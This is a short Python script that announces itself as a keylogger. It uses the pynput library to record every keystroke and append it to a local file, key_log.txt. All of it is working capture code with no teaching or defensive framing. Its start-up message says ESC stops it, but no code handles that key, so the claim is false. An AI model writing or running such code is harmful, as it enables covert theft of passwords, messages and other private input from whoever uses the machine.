from pynput import keyboard

# Log file path
log_file = "key_log.txt"

# Function to write keystrokes to a file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listener
print("🔒 Keylogger started (Press ESC to stop)")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

